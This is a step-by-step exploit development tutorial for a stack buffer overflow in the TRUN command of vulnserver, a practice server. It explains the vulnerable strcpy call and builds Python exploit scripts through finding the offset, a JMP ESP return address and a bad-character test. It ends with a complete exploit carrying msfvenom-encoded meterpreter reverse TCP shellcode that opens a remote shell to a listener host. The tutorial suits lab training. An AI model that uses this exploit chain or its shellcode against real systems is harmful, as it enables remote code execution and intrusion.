---
title: "Exploiting vulnserver: trun"
date: 2019-01-30
description: "Vanilla Stack Overflow"
summary: "Vanilla Stack Overflow"
tags: ["vulnserver", "buffer overflow", "exploit dev"]
---

Since we have the source code, lets have a quick look at the vulnerable code for the __TRUN__ command.

## The Code

```csharp
if (strncmp(RecvBuf, "TRUN ", 5) == 0) {
  char *TrunBuf = malloc(3000);
  memset(TrunBuf, 0, 3000);
  for (i = 5; i < RecvBufLen; i++) {
      if ((char)RecvBuf[i] == '.') {
          strncpy(TrunBuf, RecvBuf, 3000);
          Function3(TrunBuf);
          break;
      }
  }
  memset(TrunBuf, 0, 3000);
  SendResult = send( Client, "TRUN COMPLETE\n", 14, 0 );
}

...
void Function3(char *Input) {
    char Buffer2S[2000];
    strcpy(Buffer2S, Input);
  }
```

The code inside `Function3` takes our user supplied string and copies it to a local stack variable `Buffer2S`.

`char *strcpy(char *dest, const char *src)`

The unsafe C library function `strcpy` does not check the size of the destination array.

The vulnerable line: `strcpy(Buffer2S, Input)`, simply copies the memory contents of `Input` into `Buffer2S` until a __“00”__ (null-byte or null terminator) is encountered, without checking the size of area allocated to `Buffer2S`.

The command will execute fine if we run the `TRUN` command on a string smaller than 2000 characters:

<img src="/images/vulnserver/trun/Stack-Overflow-trun1.png" alt="trun-stack-normal" width="400"/>

However, If we supply the `TRUN` command with an argument __larger than 2000__ characters long it will corrupt the stack, as shown below:

<img src="/images/vulnserver/trun/Stack-Overflow-trun2.png" alt="trun-stack-overflow" width="400"/>

## Exploitation

So to trigger the buffer overflow, update the python script to send  __2800__ "A" characters after the `TRUN` command:

```python
#!/usr/bin/env python

import socket
import sys

buffer = 'A' * 2800
command = 'TRUN .'
data = command + buffer

print '[*] Sending data: ' + data
s = socket.create_connection(('192.168.185.146',9999))
s.sendall(data)
s.close()
```

When the applications sees the string __“TRUN ”__ it checks if the __5th__ character is a `.`

So to run the TRUN command successfully, you need to send `TRUN .` (space followed by dot, followed by the large buffer).

Sending the large buffer of A's:

<img src="/images/vulnserver/trun/trun-send-crash1.png" alt="trun-send-crash1" width="700"/>

On the Windows 7 machine, in Immunity debugger, we should now be able to see the vulnserver application has crashed as follows:

<img src="/images/vulnserver/trun/trun-crash1.png" alt="trun-crash1" width="900"/>

The stack has been corrupted and as a result several `registers` now contains the user supplied buffer of A's. Lets take a closer look at these register values:

<img src="/images/vulnserver/trun/trun-crash1-stack.png" alt="trun-crash1-stack" width="900"/>

- `EAX`: The EAX register contains the entire buffer including the initial `TRUN .` command.
- `ESP`: The Stack Pointer contains part of the user supplied provided buffer.
- `EBP`: The Saved Frame Pointer contains 4 x 'A' (`41414141`) characters.
- `EIP`: The Instruction Pointer also contains 4 x 'A' (`41414141`) characters.

Passing the exception to the program, the application crashes due to `EIP` containing a non readable memory address (`41414141`) as shown below:

<img src="/images/vulnserver/trun/trun-crash1-eip.png" alt="trun-crash1-eip" width="900"/>

This is a vanilla stack-based buffer overflow. We can directly control the flow of execution via the `EIP` register. The next step is to identify the four bytes that overwrite `EIP` by sending a __unique string__ in our buffer that we will search for once the application crashes. There are various ways to do this, I used the Metasploit Framework to generate a unique string of length (`-l`) 2800 characters with the following command:

```bash
msf-pattern_create -l 2800
```

<img src="/images/vulnserver/trun/trun-generate-unique-string.png" alt="trun-generate-unique-string" width="700"/>

Update the exploit script with the unique string:

```python
#!/usr/bin/env python

import socket
import sys

buffer = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2D'
command = 'TRUN .'
data = command + buffer

print '[*] Sending data: ' + data
s = socket.create_connection(('192.168.185.146',9999))
s.sendall(data)
s.close()
```

Send the updated exploit script:

<img src="/images/vulnserver/trun/trun-send-unique-string.png" alt="trun-send-unique-string" width="700"/>

Looking at the updated value of the `EIP` register in the debugger:

<img src="/images/vulnserver/trun/trun-crash-unique-string.png" alt="trun-crash-unique-string" width="900"/>


Workout the offset:

```
msf-pattern_offset -l 2800 -q 396F4338
```

<img src="/images/vulnserver/trun/trun-crash-find-offset.png" alt="trun-crash-find-offset" width="700"/>


Now to confirm that we can control the value in `EIP` by overwriting the four bytes with __B's__ (`42` in HEX).

```python
#!/usr/bin/env python

import socket
import sys

pre_padding = 'A' * 2006
eip = 'B' * 4
post_padding = 'C' * (3000 - len(pre_padding) - len(eip))
buffer = pre_padding + eip + post_padding
command = 'TRUN .'
data = command + buffer

print '[*] Sending data: ' + data
s = socket.create_connection(('192.168.185.146',9999))
s.sendall(data)
s.close()
```

<img src="/images/vulnserver/trun/trun-send-crash2.png" alt="trun-send-crash2" width="700"/>

<img src="/images/vulnserver/trun/trun-crash2-eip1.png" alt="trun-crash2-eip1" width="900"/>

## Control execution flow

Because we are overflowing a buffer on the stack, our exploit payload ends up on the stack. This is how we gain control of the return address.

During the crash we see that the saved __stack frame pointer__ (`ESP`), points directly to the start of buffer of __C's__, which we placed in the payload right after the 4 bytes of __B's__ that overwrite the __return address__ on the stack. This buffer of C's is where we will insert our shellcode later on.

The `ret` assembly call pops the 4 bytes __(BBBB)__ into `EIP`, and `ESP` points to the remainder of the buffer that follows (CCC...).

<img src="/images/vulnserver/trun/trun-crash2-eip2.png" alt="trun-crash2-eip2" width="900"/>

Due to memory protection mechanisms such as Address Space Layout Randomisation (ASLR), it is no longer possible to rely on a hard-coded return address in memory.

### JMP || CALL ESP

Instead of hard-coding a return address, we can use a register (such as `ESP` in this instance) that contains the address where the shellcode resides in memory. We then replace the values inserted into the `EIP` register with the memory address of a `JMP ESP` instruction, in order to redirect the flow of execution to our shellcode.

This can be done by finding the __opcode__ of a `jump` or `call` to that register in any non-ASLRd dll that is loaded when the application executes, and overwriting the value of `EIP` with the opcode for "jump to `ESP` register" instruction.

To find an address which contains a `JMP ESP` instruction, we can use __mona__.

For your exploit to be portable (work on other machines), it is recommended to use an address from the application you are exploiting itself, or a DLL that comes with the application.

To search a specific DLL with mona, use the `-m` flag and pass the module name. For example:

```
!mona jmp -r esp -m essfunc.dll
```

<img src="/images/vulnserver/trun/trun-jmp-esp-mona.png" alt="trun-jmp-esp-mona" width="900"/>

Go to the memory address and confirm the `JMP ESP` instruction:

<img src="/images/vulnserver/trun/trun-jmp-esp-instruction.png" alt="trun-jmp-esp-instruction" width="700"/>

The next step is to update the exploit so that the value of the `EIP` register is overwritten with the memory address of the `JMP ESP` instruction (`625011BB`), in order to redirect the flow of execution to our shellcode.

Place a breakpoint at the `JMP ESP` instruction memory address (`625011BB`) before running the updated script.

```python
#!/usr/bin/env python

import socket
import sys

pre_padding = 'A' * 2006
# 625011BB -> jmp ESP in essfunc.dll
eip = '\xBB\x11\x50\x62'
post_padding = 'C' * (3000 - len(pre_padding) - len(eip))
buffer = pre_padding + eip + post_padding
command = 'TRUN .'
data = command + buffer

print '[*] Sending data: ' + data
s = socket.create_connection(('192.168.185.146',9999))
s.sendall(data)
s.close()
```

After the application crashes, the breakpoint is hit. Stepping through this in the debugger (`F2`), the `JMP ESP` instruction is executed. `EIP` now points to `ESP`, which contains our buffer of __C's__. 

Before placing the shellcode here, it is best to test for __bad characters__ which could mangle our shellcode, resulting in our exploit failing to work. 

<img src="/images/vulnserver/trun/trun-jmp-esp-stack.png" alt="trun-jmp-esp-stack" width="900"/>

## Bad Characters

To test for bad characters, I prefer to send the characters from `01` to `FF` (excluding `00` which is a known terminator for strings in this instance) to the application, and manually check the results in the debugger. 

Lets update the script:

 ```python
 #!/usr/bin/env python

import socket
import sys

pre_padding = 'A' * 2006
# 625011BB -> jmp ESP in essfunc.dll
eip = '\xBB\x11\x50\x62'
badchars = ('\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10'
'\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20'
'\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30'
'\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40'
'\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50'
'\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60'
'\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70'
'\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80'
'\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90'
'\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0'
'\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0'
'\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0'
'\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0'
'\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0'
'\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0'
'\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff')

buffer = pre_padding + eip + badchars
command = 'TRUN .'
data = command + buffer

print '[*] Sending data: ' + data
s = socket.create_connection(('192.168.185.146',9999))
s.sendall(data)
s.close()
 ```

As we can see in the debugger, no other characters appear to be getting mangled: 

<img src="/images/vulnserver/trun/trun-badchars.png" alt="trun-badchars" width="900"/>


## Shellcode

Okay, so in theory this is the easy part... lets generate some shellcode using __msfvenom__, and replace the bad characters / buffer of C's with a meterpreter reverse tcp payload. Remember to specify the nullbyte as a bad character using the `-b '\x00'` flag.

```
msfvenom --platform windows -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.185.145 LPORT=4444 EXITFUNC=thread -b '\x00' -e x86/xor_dynamic -f python
```

<img src="/images/vulnserver/trun/trun-generate-shellcode.png" alt="trun-generate-shellcode" width="700"/>

It is advised to give the shellcode encoder some space before executing, so I have included a __32 byte nopsled__ (`'\x90' * 32`) before the shellcode.

```python
#!/usr/bin/env python

import socket
import sys

pre_padding = 'A' * 2006
eip = '\xBB\x11\x50\x62'
shellcode = '\x90' * 32
shellcode += '\xeb\x23\x5b\x89\xdf\xb0\x36\xfc\xae\x75\xfd\x89\xf9'
shellcode += '\x89\xde\x8a\x06\x30\x07\x47\x66\x81\x3f\x40\xc0\x74'
shellcode += '\x08\x46\x80\x3e\x36\x75\xee\xeb\xea\xff\xe1\xe8\xd8'
shellcode += '\xff\xff\xff\x09\x36\xf5\xe1\x8b\x09\x09\x09\x69\x80'
shellcode += '\xec\x38\xc9\x6d\x82\x59\x39\x82\x5b\x05\x82\x5b\x1d'
shellcode += '\x82\x7b\x21\x06\xbe\x43\x2f\x38\xf6\xa5\x35\x68\x75'
shellcode += '\x0b\x25\x29\xc8\xc6\x04\x08\xce\xeb\xfb\x5b\x5e\x82'
shellcode += '\x5b\x19\x82\x43\x35\x82\x45\x18\x71\xea\x41\x08\xd8'
shellcode += '\x58\x82\x50\x29\x08\xda\x82\x40\x11\xea\x33\x40\x82'
shellcode += '\x3d\x82\x08\xdf\x38\xf6\xa5\xc8\xc6\x04\x08\xce\x31'
shellcode += '\xe9\x7c\xff\x0a\x74\xf1\x32\x74\x2d\x7c\xed\x51\x82'
shellcode += '\x51\x2d\x08\xda\x6f\x82\x05\x42\x82\x51\x15\x08\xda'
shellcode += '\x82\x0d\x82\x08\xd9\x80\x4d\x2d\x2d\x52\x52\x68\x50'
shellcode += '\x53\x58\xf6\xe9\x56\x56\x53\x82\x1b\xe2\x84\x54\x61'
shellcode += '\x3a\x3b\x09\x09\x61\x7e\x7a\x3b\x56\x5d\x61\x45\x7e'
shellcode += '\x2f\x0e\x80\xe1\xf6\xd9\xb1\x99\x08\x09\x09\x20\xcd'
shellcode += '\x5d\x59\x61\x20\x89\x62\x09\xf6\xdc\x63\x03\x61\xc9'
shellcode += '\xa1\xb0\x98\x61\x0b\x09\x18\x55\x80\xef\x59\x59\x59'
shellcode += '\x59\x49\x59\x49\x59\x61\xe3\x06\xd6\xe9\xf6\xdc\x9e'
shellcode += '\x63\x19\x5f\x5e\x61\x90\xac\x7d\x68\xf6\xdc\x8c\xc9'
shellcode += '\x7d\x03\xf6\x47\x01\x7c\xe5\xe1\x6e\x09\x09\x09\x63'
shellcode += '\x09\x63\x0d\x5f\x5e\x61\x0b\xd0\xc1\x56\xf6\xdc\x8a'
shellcode += '\xf1\x09\x77\x3f\x82\x3f\x63\x49\x61\x09\x19\x09\x09'
shellcode += '\x5f\x63\x09\x61\x51\xad\x5a\xec\xf6\xdc\x9a\x5a\x63'
shellcode += '\x09\x5f\x5a\x5e\x61\x0b\xd0\xc1\x56\xf6\xdc\x8a\xf1'
shellcode += '\x09\x74\x21\x51\x61\x09\x49\x09\x09\x63\x09\x59\x61'
shellcode += '\x02\x26\x06\x39\xf6\xdc\x5e\x61\x7c\x67\x44\x68\xf6'
shellcode += '\xdc\x57\x57\xf6\x05\x2d\x06\x8c\x79\xf6\xf6\xf6\xe0'
shellcode += '\x92\xf6\xf6\xf6\x08\xca\x20\xcf\x7c\xc8\xca\xb2\xe9'
shellcode += '\x14\x23\x03\x61\xaf\x9c\xb4\x94\xf6\xdc\x35\x0f\x75'
shellcode += '\x03\x89\xf2\xe9\x7c\x0c\xb2\x4e\x1a\x7b\x66\x63\x09'
shellcode += '\x5a\xf6\xdc\x40\xc0'

buffer = pre_padding + eip + shellcode
command = 'TRUN .'
data = command + buffer

print '[*] Sending data: ' + data
s = socket.create_connection(('192.168.185.146',9999))
s.sendall(data)
s.close()
```

Time to send the final payload, make sure you start the __metasploit listener__. I used the `exploit/multi/handler` and the appropriate payload: `windows/meterpreter/reverse_tcp`. 

Sending the final exploit:

<img src="/images/vulnserver/trun/trun-send-shellcode.png" alt="trun-send-shellcode" width="700"/>

Getting a meterpreter shell from the victim:

<img src="/images/vulnserver/trun/trun-metasploit-listener.png" alt="trun-metasploit-listener" width="700"/>
